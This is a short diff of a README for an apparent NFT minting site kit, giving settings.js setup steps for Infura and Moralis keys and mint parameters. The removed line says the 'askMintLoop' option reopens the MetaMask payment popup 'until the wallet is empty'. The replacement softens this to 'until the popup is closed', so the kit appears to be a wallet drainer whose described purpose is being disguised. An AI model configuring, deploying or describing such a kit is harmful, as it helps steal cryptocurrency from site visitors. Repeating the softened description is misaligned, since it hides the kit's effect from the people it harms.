@@ -20,8 +20,8 @@ you need to edit the **settings.js** file.
 - line 2: const infuraId = "APP ID"; replace **APP ID with your Infura ID**
 - line 3: const moralisApi = "X-API-KEY"; replace **X-API-KEY with your Moralis web3 api key**
 
-In the settings.js files, lines after "const mintInfo" will change the minting price, the maximum supply, the minimum to be minted if the person doesn't have any NFTs, the maximum to be minted...
-Line "askMintLoop: true," = metamask popup will open again and again until the wallet is empty.
+  - Also, line after "const mintInfo" will change the minting price, the maximum supply, the minimum to be minted if the person doesn't have any NFTs, the maximum to be minted...
+  - Line "askMintLoop: true" = metamask popup will open again and again until the popup is closed.
 
 # ☁️ Important : 
 
